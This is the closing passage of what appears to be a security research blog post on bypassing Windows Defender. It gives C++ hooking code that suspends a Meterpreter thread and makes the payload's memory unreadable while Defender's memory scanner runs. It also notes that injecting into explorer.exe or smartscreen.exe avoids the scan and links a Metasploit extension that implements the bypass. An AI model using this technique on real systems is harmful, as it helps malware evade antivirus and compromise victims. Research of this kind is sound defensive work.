<span class="hljs-built_in dark">CopyMemory</span>(hookResult-&gt;hookFunAddr, hookResult-&gt;originalData, hookResult-&gt;len);

DWORD dummy;

<span class="hljs-built_in dark">VirtualProtect</span>(hookResult-&gt;hookFunAddr, hookResult-&gt;len, currProt, &amp;dummy);

<span class="hljs-built_in dark">HeapFree</span>(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, hookResult-&gt;originalData);
<span class="hljs-built_in dark">HeapFree</span>(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, hookResult);

return TRUE;
}</code></pre>
</div>
</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p>When our Metasploit payload calls the CreateProcess function, our custom hookCreateProcessInternalW method will be executed instead. hookCreateProcessInternalW calls createProcessNinja on another thread to hide the Meterpreter payload.</p>


	
    


</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="codeBlock parbase aem-GridColumn aem-GridColumn--default--8">
<div>
	<pre><code class="dark hljs language-cpp"><span class="hljs-function dark">BOOL
WINAPI
<span class="hljs-title dark">hookCreateProcessInternalW</span><span class="hljs-params dark">(HANDLE hToken,
LPCWSTR lpApplicationName,
LPWSTR lpCommandLine,
LPSECURITY_ATTRIBUTES lpProcessAttributes,
LPSECURITY_ATTRIBUTES lpThreadAttributes,
BOOL bInheritHandles,
DWORD dwCreationFlags,
LPVOID lpEnvironment,
LPCWSTR lpCurrentDirectory,
LPSTARTUPINFOW lpStartupInfo,
LPPROCESS_INFORMATION lpProcessInformation,
PHANDLE hNewToken)</span>
</span>{
BOOL res = FALSE;
<span class="hljs-built_in dark">restoreHook</span>(createProcessHookResult);
createProcessHookResult = <span class="hljs-literal dark">NULL</span>;

<span class="hljs-built_in dark">printf</span>(<span class="hljs-string dark">"My createProcess called\n"</span>);

LPVOID options = <span class="hljs-built_in dark">makeProcessOptions</span>(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation, hNewToken);

HANDLE thread = <span class="hljs-built_in dark">CreateThread</span>(<span class="hljs-literal dark">NULL</span>, <span class="hljs-number dark">0</span>, (LPTHREAD_START_ROUTINE)createProcessNinja, options, <span class="hljs-number dark">0</span>, <span class="hljs-literal dark">NULL</span>);

<span class="hljs-built_in dark">printf</span>(<span class="hljs-string dark">"[!] Waiting for thread to finish\n"</span>);
<span class="hljs-built_in dark">WaitForSingleObject</span>(thread, INFINITE);

<span class="hljs-built_in dark">GetExitCodeThread</span>(thread, (LPDWORD)&amp; res);

<span class="hljs-built_in dark">printf</span>(<span class="hljs-string dark">"[!] Thread finished\n"</span>);

<span class="hljs-built_in dark">CloseHandle</span>(thread);

createProcessHookResult = <span class="hljs-built_in dark">installHook</span>(CreateProcessInternalW, hookCreateProcessInternalW, <span class="hljs-number dark">5</span>);

<span class="hljs-keyword dark">return</span> res;
}</code></pre>
</div>
</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p>Notice that setPermissions is used to set the PAGE_NOACCESS permission on our memory before the call to CreateProcess is finally made.&nbsp;</p>


	
    


</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="codeBlock parbase aem-GridColumn aem-GridColumn--default--8">
<div>
	<pre><code class="dark hljs language-rust">BOOL <span class="hljs-title function_ invoke__ dark">createProcessNinja</span>(LPVOID options) {
LPPROCESS_OPTIONS processOptions = (LPPROCESS_OPTIONS)options;

<span class="hljs-title function_ invoke__ dark">printf</span>(<span class="hljs-string dark">"Thread Handle: %02lX\n"</span>, metasploitThread);


<span class="hljs-title function_ invoke__ dark">if</span> (<span class="hljs-title function_ invoke__ dark">SuspendThread</span>(metasploitThread) != -<span class="hljs-number dark">1</span>) {
<span class="hljs-title function_ invoke__ dark">printf</span>(<span class="hljs-string dark">"[!] Suspended thread \n"</span>);
}
<span class="hljs-keyword dark">else</span> {
<span class="hljs-title function_ invoke__ dark">printf</span>(<span class="hljs-string dark">"Couldnt suspend thread: %d\n"</span>, <span class="hljs-title function_ invoke__ dark">GetLastError</span>());
}


<span class="hljs-title function_ invoke__ dark">setPermissions</span>(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_NOACCESS);

BOOL res = <span class="hljs-title function_ invoke__ dark">CreateProcessInternalW</span>(processOptions<span class="hljs-punctuation dark">-&gt;</span>hToken,
processOptions<span class="hljs-punctuation dark">-&gt;</span>lpApplicationName,
processOptions<span class="hljs-punctuation dark">-&gt;</span>lpCommandLine,
processOptions<span class="hljs-punctuation dark">-&gt;</span>lpProcessAttributes,
processOptions<span class="hljs-punctuation dark">-&gt;</span>lpThreadAttributes,
processOptions<span class="hljs-punctuation dark">-&gt;</span>bInheritHandles,
processOptions<span class="hljs-punctuation dark">-&gt;</span>dwCreationFlags,
processOptions<span class="hljs-punctuation dark">-&gt;</span>lpEnvironment,
processOptions<span class="hljs-punctuation dark">-&gt;</span>lpCurrentDirectory,
processOptions<span class="hljs-punctuation dark">-&gt;</span>lpStartupInfo,
processOptions<span class="hljs-punctuation dark">-&gt;</span>lpProcessInformation,
processOptions<span class="hljs-punctuation dark">-&gt;</span>hNewToken);

<span class="hljs-title function_ invoke__ dark">Sleep</span>(<span class="hljs-number dark">7000</span>);

<span class="hljs-title function_ invoke__ dark">if</span> (<span class="hljs-title function_ invoke__ dark">setPermissions</span>(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_EXECUTE_READWRITE)) {
<span class="hljs-title function_ invoke__ dark">printf</span>(<span class="hljs-string dark">"ALL OK, resuming thread\n"</span>);

<span class="hljs-title function_ invoke__ dark">ResumeThread</span>(metasploitThread);
}
<span class="hljs-keyword dark">else</span> {
<span class="hljs-title function_ invoke__ dark">printf</span>(<span class="hljs-string dark">"[X] Coundn't revert permissions back to normal\n"</span>);
}

<span class="hljs-title function_ invoke__ dark">HeapFree</span>(<span class="hljs-title function_ invoke__ dark">GetProcessHeap</span>(), HEAP_GENERATE_EXCEPTIONS, processOptions);
<span class="hljs-keyword dark">return</span> res;
}</code></pre>
</div>
</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p>A brief sleep of five seconds is taken to let the Windows Defender scan complete before the permissions of the Metasploit modules are reverted back to normal. Five seconds was sufficient during testing however this may take longer on other systems or processes.</p>
<p>Also during testing it was found that some processes didn’t trigger Windows Defender even though they made calls to those WinAPI functions. Those processes are:</p>
<ul><li>explorer.exe</li><li>smartscreen.exe</li></ul>
<p>So another potential bypass would be to simply inject your Meterpreter payload within either process and you would bypass Windows Defender’s memory scanner. Although unconfirmed we believe this may have been a performance optimization as those two processes often call CreateProcess.</p>
<p>A custom Metasploit extension called Ninjasploit was written to be used as a post exploitation extension to bypass Windows Defender. The extension provides two commands install_hooks and restore_hooks which implement the memory modification bypass previously described. The extension can be found here:</p>
<p><a href="https://github.com/FSecureLABS/Ninjasploit">https://github.com/FSecureLABS/Ninjasploit</a></p>


	
    


</div>

    
</div>
</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="responsivegrid aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--8 aem-GridColumn--offset--default--0">


<div class="aem-Grid aem-Grid--8 aem-Grid--default--8 ">
    
    <div class="anchor aem-GridColumn aem-GridColumn--default--8"><div class="cmp-anchor cmp-anchor--offset" id="part7"></div>

    


</div>
<div class="title parbase aem-GridColumn aem-GridColumn--default--8">
	<h3 class="cmp-title__text grey-text">
		Conclusion
	</h3>

    
</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p>In recent years Windows Defender has made some great improvements, yet as this testing showed, with relatively little effort the static analysis and even runtime analysis can be bypassed.&nbsp;</p>
<p>We showed how payload encryption and common process injection techniques could be used to bypass Windows Defender. And while more advanced runtime analysis provided an additional hurdle it was still relatively straight forward to bypass by abusing the limitations of real-time memory scanning. Although not the focus of this post it would have been interesting to perform the same testing against next-gen file classification as well as modern EDR solutions as these may have provided additional challenges.</p>
<p>Special thanks Luke Jennings and Arran Purewal for all their help and support during this research project.</p>


	
    


</div>

    
</div>
</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="responsivegrid aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--8 aem-GridColumn--offset--default--0">


<div class="aem-Grid aem-Grid--8 aem-Grid--default--8 ">
    
    <div class="title parbase aem-GridColumn aem-GridColumn--default--8">
	<h4 class="cmp-title__text grey-text">
		References
	</h4>

    
</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p><a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a></p>
<p><a href="https://github.com/Veil-Framework/Veil"></a><a href="https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion/source">https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion/source</a></p>
<p><a href="https://github.com/FSecureLABS/Ninjasploit">https://github.com/FSecureLABS/Ninjasploit</a></p>


	
    


</div>

    
</div>
</div>

    
</div>

		</div>
	</div>

</div>

    
</div>

		</div>
	</div>

</div>

    
</div>
</div>

    
</div>
</div>

    
</div>
</div>

    
</div>
</div>

</div>






		
	
	
    





	
	
		
    









	
		
    







	
		
    




	
		
    









	
		
    



	
		
    



	
		
    




	
		
    



	
		
    




	
		
    





	

	
	
	


	


		

	

</body></html>